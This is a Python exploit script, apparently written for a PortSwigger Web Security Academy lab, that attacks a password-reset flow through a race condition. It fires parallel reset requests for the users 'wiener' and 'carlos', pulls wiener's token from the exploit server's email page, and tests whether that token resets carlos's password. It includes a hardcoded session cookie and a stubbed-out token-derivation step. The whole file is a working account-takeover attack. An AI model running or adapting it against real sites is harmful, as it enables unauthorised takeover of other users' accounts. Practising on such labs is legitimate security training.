#!/usr/bin/env python3
import requests
import urllib3
import re
import time
from concurrent.futures import ThreadPoolExecutor

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
TARGET_HOST = "0afd00da03d69f0f803617a200220017.web-security-academy.net"
EXPLOIT_SERVER = "https://exploit-0a1c0003031e9fa5807316b801f600a8.exploit-server.net"
EMAIL_URL = f"{EXPLOIT_SERVER}/email"

RESET_URL = f"https://{TARGET_HOST}/forgot-password"
SESSION_COOKIE = "phpsessionid=UKlOPjGa38BIvkEHYb5sKCor4T7DZT5V"

def send_password_reset(username, csrf_token):
    """Send password reset request"""
    headers = {
        "Host": TARGET_HOST,
        "Cookie": SESSION_COOKIE,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    }

    data = {
        "csrf": csrf_token,
        "username": username
    }

    response = requests.post(RESET_URL, headers=headers, data=data, verify=False)
    return response

def get_csrf_token():
    """Fetch CSRF token from the forgot-password page"""
    response = requests.get(RESET_URL, verify=False)
    match = re.search(r'name="csrf"\s+value="([^"]+)"', response.text)
    if match:
        return match.group(1)
    return None

def get_latest_email():
    """Fetch the latest email from exploit server"""
    response = requests.get(EMAIL_URL, verify=False)
    # Extract the latest token from the email page
    matches = re.findall(r'token=([a-f0-9]{40})', response.text)
    if matches:
        return matches[0]  # Return the first (most recent) token
    return None

def test_token_for_user(token, username):
    """Test if a token works for a specific user"""
    test_url = f"https://{TARGET_HOST}/forgot-password?user={username}&token={token}"
    response = requests.get(test_url, verify=False, allow_redirects=False)

    # Check if we get a password reset form (success) or error
    if "Set a new password" in response.text or response.status_code == 200:
        return True
    return False

def exploit():
    """Main exploit function"""
    print("[*] Starting timing-based token exploitation...")

    # Get CSRF token
    csrf_token = get_csrf_token()
    if not csrf_token:
        print("[-] Failed to get CSRF token")
        return

    print(f"[+] Got CSRF token: {csrf_token[:20]}...")

    # Send parallel requests for wiener and carlos
    print("[*] Sending parallel password reset requests for wiener and carlos...")

    with ThreadPoolExecutor(max_workers=2) as executor:
        # Submit both requests simultaneously
        future_wiener = executor.submit(send_password_reset, "wiener", csrf_token)
        future_carlos = executor.submit(send_password_reset, "carlos", csrf_token)

        # Wait for both to complete
        wiener_response = future_wiener.result()
        carlos_response = future_carlos.result()

    print(f"[+] Wiener response: {wiener_response.status_code}")
    print(f"[+] Carlos response: {carlos_response.status_code}")

    # Wait a moment for email to arrive
    print("[*] Waiting for email to arrive...")
    time.sleep(2)

    # Fetch wiener's token
    wiener_token = get_latest_email()
    if not wiener_token:
        print("[-] Failed to fetch wiener's token from email")
        return

    print(f"[+] Wiener's token: {wiener_token}")

    # Test if wiener's token works for carlos
    print("[*] Testing if wiener's token works for carlos...")
    if test_token_for_user(wiener_token, "carlos"):
        print(f"\nðŸŽ¯ SUCCESS! Wiener's token works for carlos!")
        print(f"[+] Carlos reset URL: https://{TARGET_HOST}/forgot-password?user=carlos&token={wiener_token}")
        return wiener_token
    else:
        print("[-] Wiener's token doesn't work for carlos directly")

        # Try variations - maybe tokens are sequential or have predictable differences
        print("[*] Trying to derive carlos's token from wiener's...")
        # This is where we'd implement token derivation if we find a pattern

    return None

if __name__ == "__main__":
    for attempt in range(5):
        print(f"\n{'='*60}")
        print(f"Attempt {attempt + 1}/5")
        print(f"{'='*60}\n")

        result = exploit()
        if result:
            print("\n[+] Exploitation successful!")
            break

        print(f"\n[-] Attempt {attempt + 1} failed, trying again...")
        time.sleep(1)
    else:
        print("\n[-] All attempts failed")
